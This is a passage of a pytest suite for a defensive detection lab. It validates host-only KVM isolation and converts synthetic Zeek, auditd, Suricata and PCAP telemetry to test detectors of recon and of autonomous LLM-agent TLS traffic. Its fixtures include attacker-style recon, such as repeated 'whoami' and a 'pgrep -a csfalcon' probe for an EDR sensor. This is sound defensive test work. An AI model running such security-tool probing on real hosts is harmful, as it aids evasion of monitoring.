"""Automated validation for the reproducible host-only isolated KVM/QEMU Sensor + Target Lab (`lab/kvm/`)."""

import importlib.util
import json
import os
import shutil
import subprocess
import sys
import xml.etree.ElementTree as ET
from pathlib import Path

import pytest
import yaml

from artex_defense.detectors import scan_telemetry_file

REPO_ROOT = Path(__file__).resolve().parent.parent
LAB_DIR = REPO_ROOT / "lab" / "kvm"


def _load_exporter():
    spec = importlib.util.spec_from_file_location("export_sensor_to_jsonl", LAB_DIR / "export_sensor_to_jsonl.py")
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_kvm_network_xml_enforces_strict_host_only_isolation() -> None:
    xml_path = LAB_DIR / "network_artex_isolated.xml"
    tree = ET.parse(xml_path)
    root = tree.getroot()
    assert root.findtext("name") == "artex-lab-isolated"
    # HARD SECURITY INVARIANT: zero <forward> directive allowed
    assert root.find("forward") is None, "Host-only isolated network XML must NOT contain <forward>!"
    ip_el = root.find("ip")
    assert ip_el is not None and ip_el.attrib.get("address") == "192.168.250.1"


def test_cloud_init_configs_valid_and_have_no_default_gateway() -> None:
    for role, expected_ip in (("sensor", "192.168.250.10/24"), ("target", "192.168.250.20/24")):
        role_dir = LAB_DIR / "cloud-init" / role
        user_data = yaml.safe_load((role_dir / "user-data.yaml").read_text(encoding="utf-8"))
        meta_data = yaml.safe_load((role_dir / "meta-data.yaml").read_text(encoding="utf-8"))
        net_cfg = yaml.safe_load((role_dir / "network-config.yaml").read_text(encoding="utf-8"))

        assert user_data["hostname"] == f"artex-{role}-01"
        assert meta_data["local-hostname"] == f"artex-{role}-01"
        nic = net_cfg["ethernets"]["nic0"]
        assert nic["dhcp4"] is False
        assert expected_ip in nic["addresses"]
        assert "gateway4" not in nic and "routes" not in nic, f"{role} network-config must NOT set a default gateway!"


def test_lab_ctl_syntax_and_offline_seed_iso_build(tmp_path: Path) -> None:
    ctl = LAB_DIR / "lab-ctl.sh"
    res_syn = subprocess.run(["bash", "-n", str(ctl)], capture_output=True, text=True, check=False)
    assert res_syn.returncode == 0, f"lab-ctl.sh syntax error: {res_syn.stderr}"

    if shutil.which("xorriso") is None:
        pytest.skip("xorriso not installed; skipping offline cloud-init seed ISO build")

    env = dict(os.environ, ARTEX_LAB_STATE_DIR=str(tmp_path / "state"))
    seeds_dir = tmp_path / "seeds"
    res_iso = subprocess.run(
        ["bash", str(ctl), "build-seeds", str(seeds_dir)],
        capture_output=True,
        text=True,
        env=env,
        check=False,
    )
    assert res_iso.returncode == 0, f"build-seeds failed: {res_iso.stderr}"
    for name in ("sensor-seed.iso", "target-seed.iso"):
        iso = seeds_dir / name
        assert iso.is_file() and iso.stat().st_size >= 32768


def test_raw_zeek_json_and_linux_auditd_converter_feeds_artex_hunt(tmp_path: Path) -> None:
    exporter = _load_exporter()
    raw_dir = tmp_path / "raw"
    raw_dir.mkdir()

    # Real Zeek conn.log JSON with encrypted TLS sawtooth growth (orig_bytes growing, resp_bytes steady)
    conn_lines = [
        f'{{"ts":"2026-11-20T22:00:{i*10:02d}.000Z","id.orig_h":"192.168.250.20","id.resp_h":"192.168.250.99","id.resp_p":443,"orig_bytes":{b_out},"resp_bytes":{b_in},"conn_state":"SF"}}'
        for i, (b_out, b_in) in enumerate([(4000, 1800), (9200, 2100), (16800, 2700), (27500, 3100), (42000, 3500), (58000, 2900)])
    ]
    (raw_dir / "conn.log").write_text("\n".join(conn_lines) + "\n", encoding="utf-8")

    # Real raw Linux Auditd SYSCALL + EXECVE lines (with split a0/a1/a2 args) for redundant recon + idioms
    audit_lines = [
        'type=SYSCALL msg=audit(1795212001.100:101): arch=c000003e syscall=59 exe="/usr/bin/whoami" comm="whoami" auid=1000 uid=33',
        'type=EXECVE msg=audit(1795212001.100:101): argc=1 a0="whoami"',
        'type=SYSCALL msg=audit(1795212011.100:102): arch=c000003e syscall=59 exe="/usr/bin/whoami" comm="whoami" auid=1000 uid=33',
        'type=EXECVE msg=audit(1795212011.100:102): argc=1 a0="whoami"',
        'type=SYSCALL msg=audit(1795212021.100:103): arch=c000003e syscall=59 exe="/usr/bin/whoami" comm="whoami" auid=1000 uid=33',
        'type=EXECVE msg=audit(1795212021.100:103): argc=1 a0="whoami"',
    ]
    (raw_dir / "target_audit.log").write_text("\n".join(audit_lines) + "\n", encoding="utf-8")

    out_jsonl = tmp_path / "lab_telemetry.jsonl"
    count = exporter.convert_directory(raw_dir, out_jsonl)
    assert count == 9

    cands = scan_telemetry_file(out_jsonl)
    observed = {r for c in cands for r in c.reasons}
    assert "llm_sawtooth_context_flow" in observed
    assert "multi_worker_redundant_recon" in observed


def test_zeek_ssl_uid_joins_sni_and_ja4_onto_conn_log_for_per_sni_sawtooth(tmp_path: Path) -> None:
    """Real Zeek writes byte counts in conn.log and SNI/JA4 in ssl.log linked by `uid`."""
    exporter = _load_exporter()
    raw_dir = tmp_path / "raw"
    raw_dir.mkdir()

    # Two distinct SNIs sharing the same reverse-proxy IP (172.30.0.20), plus a second ssl.log row
    # with empty server_name/ja4 for the same uid (must NOT overwrite prior values) and an HTTP uid
    # present in both conn.log and http.log (must deduplicate to 1 event instead of double-counting).
    conn_lines = [
        '{"ts":1795212000.0,"uid":"Cbenign1","id.orig_h":"172.30.0.10","id.resp_h":"172.30.0.20","id.resp_p":443,"orig_bytes":500,"resp_bytes":1200,"conn_state":"SF"}',
        '{"ts":1795212001.0,"uid":"Chttp1","id.orig_h":"172.30.0.10","id.resp_h":"172.30.0.20","id.resp_p":80,"orig_bytes":120,"resp_bytes":400,"conn_state":"SF"}',
        "not-valid-json-line",
    ]
    http_lines = [
        '{"ts":1795212001.0,"uid":"Chttp1","id.orig_h":"172.30.0.10","id.resp_h":"172.30.0.20","id.resp_p":80,"method":"GET","uri":"/dashboard","status_code":200,"user_agent":"Mozilla/5.0"}',
    ]
    ssl_lines = [
        '{"ts":1795212000.0,"uid":"Cbenign1","id.orig_h":"172.30.0.10","id.resp_h":"172.30.0.20","id.resp_p":443,"server_name":"benign-cdn.lab.local","ja4":"t13d1516h2_8daaf6152771_e5627efa2ab1"}',
        '{"ts":1795212000.1,"uid":"Cbenign1","id.orig_h":"172.30.0.10","id.resp_h":"172.30.0.20","id.resp_p":443}',
    ]
    for i, b_out in enumerate((4000, 9500, 17500, 29000, 44000, 62000)):
        ts = 1795212005.0 + i * 3.5
        uid = f"Csaw{i}"
        conn_lines.append(
            f'{{"ts":{ts},"uid":"{uid}","id.orig_h":"172.30.0.10","id.resp_h":"172.30.0.20","id.resp_p":443,"orig_bytes":{b_out},"resp_bytes":2200,"conn_state":"SF"}}'
        )
        ssl_lines.append(
            f'{{"ts":{ts},"uid":"{uid}","id.orig_h":"172.30.0.10","id.resp_h":"172.30.0.20","id.resp_p":443,"server_name":"relay-node-44.lab.local","ja4":"t13d1516h2_8daaf6152771_e5627efa2ab1"}}'
        )
    (raw_dir / "conn.log").write_text("\n".join(conn_lines) + "\n", encoding="utf-8")
    (raw_dir / "http.log").write_text("\n".join(http_lines) + "\n", encoding="utf-8")
    (raw_dir / "ssl.log").write_text("\n".join(ssl_lines) + "\n", encoding="utf-8")

    out_jsonl = tmp_path / "zeek_joined.jsonl"
    count = exporter.convert_directory(raw_dir, out_jsonl)
    # 1 benign TLS conn + 6 sawtooth TLS conn + 1 http (Chttp1 conn & merged ssl rows deduplicated) = 8
    assert count == 8
    text = out_jsonl.read_text(encoding="utf-8")
    assert '"dest_host": "benign-cdn.lab.local"' in text
    assert '"dest_host": "relay-node-44.lab.local"' in text
    assert '"ja4": "t13d1516h2_8daaf6152771_e5627efa2ab1"' in text

    cands = scan_telemetry_file(out_jsonl)
    observed = {r for c in cands for r in c.reasons}
    assert "llm_sawtooth_context_flow" in observed


def test_lab_ctl_isolated_xml_check_ignores_xml_comments() -> None:
    """`require_isolated_xml` and `require_isolated_stdin` must parse XML elements rather than grepping comments."""
    ctl = LAB_DIR / "lab-ctl.sh"
    xml_path = LAB_DIR / "network_artex_isolated.xml"
    res = subprocess.run(
        ["bash", "-c", f'source <(sed "/^case /,\\$d" "{ctl}"); NET_XML="{xml_path}"; require_isolated_xml'],
        capture_output=True,
        text=True,
        check=False,
    )
    assert res.returncode == 0, f"require_isolated_xml failed on isolated XML: {res.stderr}"

    res_stdin_ok = subprocess.run(
        ["bash", "-c", f'source <(sed "/^case /,\\$d" "{ctl}"); require_isolated_stdin'],
        input="<network><!-- no <forward> --><name>artex-lab-isolated</name></network>",
        capture_output=True,
        text=True,
        check=False,
    )
    assert res_stdin_ok.returncode == 0

    res_stdin_bad = subprocess.run(
        ["bash", "-c", f'source <(sed "/^case /,\\$d" "{ctl}"); require_isolated_stdin'],
        input='<network><name>bad</name><forward mode="nat"/></network>',
        capture_output=True,
        text=True,
        check=False,
    )
    assert res_stdin_bad.returncode != 0


def test_auditd_exporter_skips_failed_path_probes_resolves_ppid_and_decodes_hex() -> None:
    """Real Linux kernel auditd emits `success=no` ENOENT PATH probes, `pid`/`ppid`, and hex-encoded EXECVE args."""
    exporter = _load_exporter()
    # Hex for `pgrep -a csfalcon` -> 7067726570202D6120637366616C636F6E
    audit_lines = [
        'type=SYSCALL msg=audit(1795369199.100:250): arch=c000003e syscall=59 success=yes exit=0 ppid=900 pid=910 auid=1000 uid=1000 comm="bash" exe="/usr/bin/bash"',
        'type=EXECVE msg=audit(1795369199.100:250): argc=3 a0="bash" a1="-c" a2=7067726570202D6120637366616C636F6E',
        # Failed PATH lookup (success=no, exit=-2, no EXECVE) -> must be skipped
        'type=SYSCALL msg=audit(1795369199.116:251): arch=c000003e syscall=59 success=no exit=-2 ppid=910 pid=911 auid=1000 uid=1000 comm="env" exe="/usr/bin/env"',
        # Child process referencing ppid=910 -> parent_process must resolve to /usr/bin/bash
        'type=SYSCALL msg=audit(1795369199.120:252): arch=c000003e syscall=59 success=yes exit=0 ppid=910 pid=912 auid=1000 uid=1000 comm="pgrep" exe="/usr/bin/pgrep"',
        'type=EXECVE msg=audit(1795369199.120:252): argc=3 a0="pgrep" a1="-a" a2="csfalcon"',
    ]
    events = exporter.convert_auditd_lines(audit_lines)
    assert len(events) == 2
    assert events[0]["process"] == "/usr/bin/bash"
    assert events[0]["command_line"] == "bash -c pgrep -a csfalcon"
    assert events[1]["process"] == "/usr/bin/pgrep"
    assert events[1]["parent_process"] == "/usr/bin/bash"
    assert events[1]["command_line"] == "pgrep -a csfalcon"


def _write_synthetic_pcap(path: Path, packets: list[tuple[float, str, int, str, int, int]], *, linktype: int = 1) -> None:
    """Build a minimal valid PCAP (Ethernet DLT=1 or Linux SLL2 DLT=276) with IPv4/TCP payload packets."""
    import socket
    import struct

    chunks = [struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, linktype)]
    for ts, src_ip, sport, dst_ip, dport, pay_len in packets:
        remaining = pay_len
        while remaining > 0:
            seg = min(remaining, 1400)
            remaining -= seg
            tcp_hdr = struct.pack("!HHIIBBHHH", sport, dport, 1, 1, 0x50, 0x18, 65535, 0, 0)
            ip_tot = 20 + 20 + seg
            ip_hdr = struct.pack(
                "!BBHHHBBH4s4s",
                0x45,
                0,
                ip_tot,
                1,
                0,
                64,
                6,
                0,
                socket.inet_aton(src_ip),
                socket.inet_aton(dst_ip),
            )
            if linktype == 276:
                l2 = struct.pack("!HHI", 0x0800, 0, 1) + b"\x00" * 12
            else:
                l2 = b"\x00" * 12 + struct.pack("!H", 0x0800)
            frame = l2 + ip_hdr + tcp_hdr + (b"X" * seg)
            sec = int(ts)
            usec = int((ts - sec) * 1_000_000)
            chunks.append(struct.pack("<IIII", sec, usec, len(frame), len(frame)) + frame)
    path.write_bytes(b"".join(chunks))


def test_persistent_tls_agent_turn_loop_detects_single_socket_agent_and_rejects_rest_and_human_chat(tmp_path: Path) -> None:
    """Zero-IOC persistent TLS 1.3 detector: catches single-socket autonomous agent loops, rejects fast REST & human chat."""
    exporter = _load_exporter()

    # 1. TP: Single persistent TLS 1.3 socket (custom VPS IP) with 5 growing turns (35KB->40KB),
    # 1.2s LLM inference latency, 0.05s autonomous client turnaround, plus an interleaved 2.4KB sidecar!
    tp_pkts: list[tuple[float, str, int, str, int, int]] = []
    t = 1795374100.0
    for idx, (o_b, i_b) in enumerate([(35156, 117491), (2400, 18000), (35967, 128042), (36943, 119618), (37734, 124499), (39708, 132454)]):
        tp_pkts.append((t, "192.0.2.10", 41850, "198.51.100.77", 443, o_b))
        t += 1.4  # server LLM inference latency
        tp_pkts.append((t, "198.51.100.77", 443, "192.0.2.10", 41850, i_b))
        t += 0.05  # sub-second autonomous tool-loop turnaround
    tp_pcap = tmp_path / "agent_single_socket.pcap"
    _write_synthetic_pcap(tp_pcap, tp_pkts, linktype=276)  # Also tests Linux SLL2 (tcpdump -i any)!

    raw_tp = tmp_path / "tp_raw"
    raw_tp.mkdir()
    (raw_tp / "ssl.log").write_text(
        '{"ts":1795374099.0,"uid":"Ctp1","id.orig_h":"192.0.2.10","id.orig_p":41850,"id.resp_h":"198.51.100.77","id.resp_p":443,"server_name":"proxy-relay.example.test"}\n',
        encoding="utf-8",
    )
    tp_jsonl = tmp_path / "tp.jsonl"
    exporter.convert_directory(raw_tp, tp_jsonl, pcap_path=tp_pcap)
    cands = scan_telemetry_file(tp_jsonl)
    assert len(cands) == 1
    assert cands[0].reasons == ["encrypted_tls_agent_turn_loop"]
    assert cands[0].risk_score == 65
    assert cands[0].alert_tier == "hunt"
    assert any("tls_agent_loop:proxy-relay.example.test(" in ind for ind in cands[0].matched_indicators)

    # 2. FP Guard A: Benign fast REST/analytics stream (0.03s latency, chaotic sizes, 10s periodic flush) -> 0 hits
    rest_pkts: list[tuple[float, str, int, str, int, int]] = []
    t = 1795375000.0
    for o_b, i_b in [(53000, 485), (17900, 1216), (206000, 478), (566000, 401), (26400, 1136)]:
        rest_pkts.append((t, "192.0.2.20", 37840, "198.51.100.90", 443, o_b))
        t += 0.03  # fast REST ACK
        rest_pkts.append((t, "198.51.100.90", 443, "192.0.2.20", 37840, i_b))
        t += 10.0
    rest_pcap = tmp_path / "benign_rest.pcap"
    _write_synthetic_pcap(rest_pcap, rest_pkts, linktype=1)
    assert exporter.extract_pcap_tls_turns(rest_pcap) == []

    # 3. FP Guard B: Benign fresh human ChatGPT/Claude session (4KB->22KB, 1.6s latency, 18s human reading/typing pause) -> 0 candidates!
    human_pkts: list[tuple[float, str, int, str, int, int]] = []
    t = 1795376000.0
    for o_b, i_b in [(4000, 8000), (7200, 11000), (11000, 13000), (16000, 15000), (22000, 17000)]:
        human_pkts.append((t, "192.0.2.30", 51000, "198.51.100.91", 443, o_b))
        t += 1.6  # real LLM latency
        human_pkts.append((t, "198.51.100.91", 443, "192.0.2.30", 51000, i_b))
        t += 18.0  # human pauses 18s to read response and type next prompt
    human_pcap = tmp_path / "benign_human_chat.pcap"
    _write_synthetic_pcap(human_pcap, human_pkts, linktype=1)
    raw_h = tmp_path / "human_raw"
    raw_h.mkdir()
    human_jsonl = tmp_path / "human.jsonl"
    exporter.convert_directory(raw_h, human_jsonl, pcap_path=human_pcap)
    assert scan_telemetry_file(human_jsonl) == []

    # 4. Guard: explicit nonexistent --pcap path raises FileNotFoundError instead of silently falling back
    with pytest.raises(FileNotFoundError):
        exporter.convert_directory(raw_h, tmp_path / "missing.jsonl", pcap_path=tmp_path / "does_not_exist.pcap")


def test_persistent_tls_turn_slicer_generalizes_across_wan_tools_vllm_compaction_and_benign_traps(tmp_path: Path) -> None:
    """De-overtuning regression suite: 6 realistic agent variations (TP) + 5 benign persistent-TLS traps (0 FP)."""
    exporter = _load_exporter()

    def run_case(name: str, pkts: list[tuple[float, str, int, str, int, int]]) -> list[str]:
        pcap = tmp_path / f"{name}.pcap"
        _write_synthetic_pcap(pcap, pkts, linktype=1)
        raw = tmp_path / f"{name}_raw"
        raw.mkdir()
        out_j = tmp_path / f"{name}.jsonl"
        exporter.convert_directory(raw, out_j, pcap_path=pcap)
        return [r for c in scan_telemetry_file(out_j) for r in c.reasons]

    # TP 1: Agent running real 3-5s WAN tools (nmap/ffuf/curl) between turns
    pkts: list[tuple[float, str, int, str, int, int]] = []
    t = 1795400000.0
    for ob, ib, tool_s in [(32000, 90000, 3.8), (34500, 85000, 4.5), (37100, 95000, 2.9), (39800, 92000, 5.2), (43000, 88000, 0.0)]:
        pkts.append((t, "192.0.2.10", 50001, "198.51.100.1", 443, ob))
        t += 1.4
        pkts.append((t, "198.51.100.1", 443, "192.0.2.10", 50001, ib))
        t += tool_s
    assert "encrypted_tls_agent_turn_loop" in run_case("a1_wan_tools", pkts)

    # TP 2: Fast H100/vLLM proxy (0.22s TTFT)
    pkts = []
    t = 1795400000.0
    for ob, ib in [(28000, 45000), (30200, 48000), (32500, 44000), (35100, 50000), (38000, 47000)]:
        pkts.append((t, "192.0.2.10", 50002, "198.51.100.2", 443, ob))
        t += 0.22
        pkts.append((t, "198.51.100.2", 443, "192.0.2.10", 50002, ib))
        t += 0.30
    assert "encrypted_tls_agent_turn_loop" in run_case("a2_fast_vllm", pkts)

    # TP 3: HTTP/2 48B WINDOW_UPDATE interleaved mid-SSE-stream + 2.5s reasoning pause
    pkts = []
    t = 1795400000.0
    for ob, ib in [(35000, 90000), (36500, 95000), (38200, 92000), (40100, 98000), (42300, 96000)]:
        pkts.append((t, "192.0.2.10", 50003, "198.51.100.3", 443, ob))
        t += 1.5
        pkts.append((t, "198.51.100.3", 443, "192.0.2.10", 50003, 12000))
        t += 0.3
        pkts.append((t, "192.0.2.10", 50003, "198.51.100.3", 443, 48))  # H2 WINDOW_UPDATE
        t += 2.5  # reasoning thinking pause mid-stream
        pkts.append((t, "198.51.100.3", 443, "192.0.2.10", 50003, ib - 12000))
        t += 0.15
    assert "encrypted_tls_agent_turn_loop" in run_case("a3_h2_reasoning_pause", pkts)

    # TP 4: Mid-session context compaction (35K->37K->39K -> compact to 18K -> 21K -> 24K)
    pkts = []
    t = 1795400000.0
    for ob, ib in [(35000, 60000), (37000, 62000), (39000, 58000), (18000, 55000), (21000, 60000), (24000, 61000)]:
        pkts.append((t, "192.0.2.10", 50004, "198.51.100.4", 443, ob))
        t += 1.3
        pkts.append((t, "198.51.100.4", 443, "192.0.2.10", 50004, ib))
        t += 0.2
    assert "encrypted_tls_agent_turn_loop" in run_case("a4_compaction", pkts)

    # FP 1: Fast-reading human web-LLM user (8.5-12s pauses) -> 0 candidates
    pkts = []
    t = 1795400000.0
    for ob, ib, pause in [(6000, 12000, 9.0), (9000, 14000, 11.0), (12500, 11000, 8.5), (16000, 15000, 12.0), (20000, 13000, 0.0)]:
        pkts.append((t, "192.0.2.20", 51001, "198.51.100.11", 443, ob))
        t += 1.6
        pkts.append((t, "198.51.100.11", 443, "192.0.2.20", 51001, ib))
        t += pause
    assert run_case("b1_fast_human", pkts) == []

    # FP 2: Chunked S3/Docker upload (fixed 64KB chunks) -> 0 candidates
    pkts = []
    t = 1795400000.0
    for _ in range(6):
        pkts.append((t, "192.0.2.20", 51002, "198.51.100.12", 443, 65536))
        t += 0.45
        pkts.append((t, "198.51.100.12", 443, "192.0.2.20", 51002, 1200))
        t += 0.05
    assert run_case("b2_chunked_upload", pkts) == []

    # FP 3: Slow BI/GraphQL dashboard (chaotic sizes, 1.2s DB latency) -> 0 candidates
    pkts = []
    t = 1795400000.0
    for ob, ib in [(8000, 45000), (14000, 12000), (6500, 88000), (19000, 5400), (9200, 31000)]:
        pkts.append((t, "192.0.2.20", 51003, "198.51.100.13", 443, ob))
        t += 1.2
        pkts.append((t, "198.51.100.13", 443, "192.0.2.20", 51003, ib))
        t += 0.2
    assert run_case("b3_bi_graphql", pkts) == []

    # FP 4: Slow API pagination (+50B req, growing resp) -> 0 candidates
    pkts = []
    t = 1795400000.0
    for ob, ib in [(4200, 20000), (4250, 40000), (4300, 60000), (4350, 80000), (4400, 100000)]:
        pkts.append((t, "192.0.2.20", 51004, "198.51.100.14", 443, ob))
        t += 0.8
        pkts.append((t, "198.51.100.14", 443, "192.0.2.20", 51004, ib))
        t += 0.1
    assert run_case("b4_api_pagination", pkts) == []


def _build_tls_client_hello(
    *,
    ciphers: list[int],
    sni: str | None = None,
    alpn: list[str] | None = None,
    supported_versions: list[int] | None = None,
    sig_algs: list[int] | None = None,
    extra_exts: list[int] | None = None,
) -> bytes:
    """Build a valid RFC 8446 / 5246 TLS ClientHello record for deterministic FoxIO JA4 unit testing."""
    import struct

    exts = bytearray()
    if sni is not None:
        host_b = sni.encode("ascii")
        sni_entry = struct.pack("!BH", 0, len(host_b)) + host_b
        sni_data = struct.pack("!H", len(sni_entry)) + sni_entry
        exts += struct.pack("!HH", 0x0000, len(sni_data)) + sni_data
    if alpn:
        alpn_items = b"".join(struct.pack("!B", len(p.encode("ascii"))) + p.encode("ascii") for p in alpn)
        alpn_data = struct.pack("!H", len(alpn_items)) + alpn_items
        exts += struct.pack("!HH", 0x0010, len(alpn_data)) + alpn_data
    if supported_versions:
        ver_items = b"".join(struct.pack("!H", v) for v in supported_versions)
        ver_data = struct.pack("!B", len(ver_items)) + ver_items
        exts += struct.pack("!HH", 0x002B, len(ver_data)) + ver_data
    if sig_algs:
        sa_items = b"".join(struct.pack("!H", s) for s in sig_algs)
        sa_data = struct.pack("!H", len(sa_items)) + sa_items
        exts += struct.pack("!HH", 0x000D, len(sa_data)) + sa_data
    for ext_id in extra_exts or []:
        exts += struct.pack("!HH", ext_id, 0)

    cipher_bytes = b"".join(struct.pack("!H", c) for c in ciphers)
    body = bytearray()
    body += struct.pack("!H", 0x0303)  # legacy client_version TLS 1.2
    body += b"\x11" * 32  # ClientRandom
    body += b"\x00"  # session_id_len = 0
    body += struct.pack("!H", len(cipher_bytes)) + cipher_bytes
    body += b"\x01\x00"  # compression methods = [null]
    body += struct.pack("!H", len(exts)) + exts

    hs = struct.pack("!B", 0x01) + len(body).to_bytes(3, "big") + body
    return struct.pack("!BHH", 0x16, 0x0301, len(hs)) + hs


def _write_raw_payload_pcap(path: Path, frames: list[tuple[float, str, int, str, int, bytes]]) -> None:
    import socket
    import struct

    chunks = [struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)]
    for ts, src_ip, sport, dst_ip, dport, payload in frames:
        tcp_hdr = struct.pack("!HHIIBBHHH", sport, dport, 1, 1, 0x50, 0x18, 65535, 0, 0)
        ip_tot = 20 + 20 + len(payload)
        ip_hdr = struct.pack(
            "!BBHHHBBH4s4s",
            0x45,
            0,
            ip_tot,
            1,
            0,
            64,
            6,
            0,
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
        )
        l2 = b"\x00" * 12 + struct.pack("!H", 0x0800)
        frame = l2 + ip_hdr + tcp_hdr + payload
        sec = int(ts)
        usec = int((ts - sec) * 1_000_000)
        chunks.append(struct.pack("<IIII", sec, usec, len(frame), len(frame)) + frame)
    path.write_bytes(b"".join(chunks))


def test_pure_python_foxio_ja4_spec_grease_alpn_raw_ip_and_suricata_eve_ingestion(tmp_path: Path) -> None:
    """Validate pure-Python FoxIO JA4 spec compliance + PCAP->Zeek enrichment + native Suricata EVE JSON parsing."""
    import hashlib
    import json

    exporter = _load_exporter()

    # 1. TLS 1.3 + GREASE filtering + ALPN h2 + signature_algorithms (preserved unsorted!) + SNI/ALPN excluded from JA4_c
    ch_h2 = _build_tls_client_hello(
        ciphers=[0x0A0A, 0x1302, 0x1301, 0xC02F, 0xFAFA],
        sni="api.example.test",
        alpn=["h2", "http/1.1"],
        supported_versions=[0x2A2A, 0x0304, 0x0303],
        sig_algs=[0x0403, 0x0804, 0x0401],
        extra_exts=[0x3A3A, 0x0017, 0x0023],
    )
    sni_h2, ja4_h2 = exporter.parse_tls_client_hello_ja4(ch_h2)
    assert sni_h2 == "api.example.test"
    # Non-GREASE ciphers: 1301,1302,c02f (3); non-GREASE exts: 0000,0010,002b,000d,0017,0023 (6); ALPN: h2
    exp_b = hashlib.sha256(b"1301,1302,c02f").hexdigest()[:12]
    exp_c = hashlib.sha256(b"000d,0017,0023,002b_0403,0804,0401").hexdigest()[:12]
    assert ja4_h2 == f"t13d0306h2_{exp_b}_{exp_c}"

    # 2. Raw-IP TLS 1.3 (no SNI -> `i`) AND IP-literal SNI (`198.51.100.5` -> `i`)
    ch_raw = _build_tls_client_hello(
        ciphers=[0x1301, 0x1302],
        sni=None,
        supported_versions=[0x0304],
        sig_algs=[0x0804],
    )
    sni_raw, ja4_raw = exporter.parse_tls_client_hello_ja4(ch_raw)
    assert sni_raw == "" and ja4_raw.startswith("t13i020200_")

    ch_ip_sni = _build_tls_client_hello(
        ciphers=[0x1301, 0x1302],
        sni="198.51.100.5",
        supported_versions=[0x0304],
        sig_algs=[0x0804],
    )
    sni_ip, ja4_ip = exporter.parse_tls_client_hello_ja4(ch_ip_sni)
    assert sni_ip == "198.51.100.5" and ja4_ip.startswith("t13i020300_")

    # 3. TLS 1.2 without supported_versions (`t12d...00`), split across 2 TCP segments in PCAP!
    ch_12 = _build_tls_client_hello(ciphers=[0xC02F, 0x009D], sni="legacy.example.test", extra_exts=[0x0017])
    pcap_path = tmp_path / "ja4_multi.pcap"
    _write_raw_payload_pcap(
        pcap_path,
        [
            (1795401000.0, "172.30.0.10", 40001, "172.30.0.20", 443, ch_h2),
            (1795401001.0, "172.30.0.10", 40002, "172.30.0.20", 443, ch_raw),
            (1795401002.0, "172.30.0.10", 40003, "172.30.0.20", 443, ch_12[:30]),
            (1795401002.1, "172.30.0.10", 40003, "172.30.0.20", 443, ch_12[30:]),
        ],
    )
    extracted = exporter.extract_pcap_tls_ja4(pcap_path)
    assert extracted[("172.30.0.10", 40001, "172.30.0.20", 443)] == ("api.example.test", ja4_h2)
    assert extracted[("172.30.0.10", 40002, "172.30.0.20", 443)] == ("", ja4_raw)
    assert extracted[("172.30.0.10", 40003, "172.30.0.20", 443)][1].startswith("t12d020200_")

    # 4. Native Suricata EVE JSON ingestion (nested `tls.ja4`/`tls.sni` + `http.*`) triggers `ja4_client_stack_whiplash`
    eve_path = tmp_path / "suricata_eve.json"
    eve_rows = [
        {"timestamp": "2026-11-22T21:00:00.000000+0000", "event_type": "tls", "src_ip": "198.51.100.70", "dest_ip": "10.0.0.10", "dest_port": 443, "tls": {"sni": "portal.corp.local", "ja4": ja4_h2}},
        {"timestamp": "2026-11-22T21:00:01.000000+0000", "event_type": "tls", "src_ip": "198.51.100.70", "dest_ip": "10.0.0.10", "dest_port": 443, "tls": {"sni": "portal.corp.local", "ja4": ja4_raw}},
        {"timestamp": "2026-11-22T21:00:02.000000+0000", "event_type": "tls", "src_ip": "198.51.100.70", "dest_ip": "10.0.0.10", "dest_port": 443, "tls": {"sni": "portal.corp.local", "ja4": extracted[("172.30.0.10", 40003, "172.30.0.20", 443)][1]}},
        {"timestamp": "2026-11-22T21:00:02.500000+0000", "event_type": "http", "src_ip": "198.51.100.70", "dest_ip": "10.0.0.10", "dest_port": 443, "http": {"hostname": "portal.corp.local", "url": "/api/v1/admin", "http_method": "GET", "http_user_agent": "Mozilla/5.0 Chrome/131.0.0.0", "status": 403}},
    ]
    eve_path.write_text("\n".join(json.dumps(r) for r in eve_rows) + "\n", encoding="utf-8")
    cands = scan_telemetry_file(eve_path)
    assert cands and "ja4_client_stack_whiplash" in cands[0].reasons


def test_real_debian_auditd_pam_motd_and_shell_wrapper_zero_fp(tmp_path: Path) -> None:
    """Falsification regression: real Debian 12 SSH pam_motd + bash -c/child + auid=4294967295 must produce 0 FP."""
    exporter = _load_exporter()

    # Build realistic Debian 12 auditd lines for 6 benign SSH admin commands + a 25s pause before log copy
    audit_lines: list[str] = []
    eid = 1000
    t = 1795403000.0
    admin_cmds = [
        ("uname -a; uptime", "/usr/bin/uname", ["uname", "-a"]),
        ("df -h; free -m", "/usr/bin/df", ["df", "-h"]),
        ("ip addr show", "/usr/bin/ip", ["ip", "addr", "show"]),
        ("ss -tulpn | head -n 15", "/usr/bin/ss", ["ss", "-tulpn"]),
        ("ps aux | head -n 15", "/usr/bin/ps", ["ps", "aux"]),
        ("cat /etc/os-release", "/usr/bin/cat", ["cat", "/etc/os-release"]),
    ]
    for full_cmd, child_exe, child_args in admin_cmds:
        # sshd daemon re-exec with unset auid=4294967295 (must fall back to uid:0, NOT uid:4294967295!)
        eid += 1
        audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=4294967295 uid=0 pid=100 ppid=1 comm="sshd" exe="/usr/sbin/sshd"')
        audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc=3 a0="/usr/sbin/sshd" a1="-D" a2="-R"')
        # Debian pam_motd burst (7 processes in 4ms including 10-uname -> uname -snrvm)
        t += 0.08
        for proc, ppid, pid, argv in [
            ("/usr/bin/dash", 100, 101, ["sh", "-c", "/usr/bin/env -i PATH=/usr/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new"]),
            ("/usr/bin/run-parts", 101, 102, ["run-parts", "--lsbsysinit", "/etc/update-motd.d"]),
            ("/usr/bin/dash", 102, 103, ["/bin/sh", "/etc/update-motd.d/10-uname"]),
            ("/usr/bin/uname", 103, 104, ["uname", "-snrvm"]),
            ("/usr/bin/dash", 102, 105, ["/bin/sh", "/usr/share/unattended-upgrades/update-motd-unattended-upgrades"]),
        ]:
            eid += 1
            a_str = " ".join(f'a{i}="{a}"' for i, a in enumerate(argv))
            audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=1000 uid=1000 pid={pid} ppid={ppid} comm="x" exe="{proc}"')
            audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc={len(argv)} {a_str}')
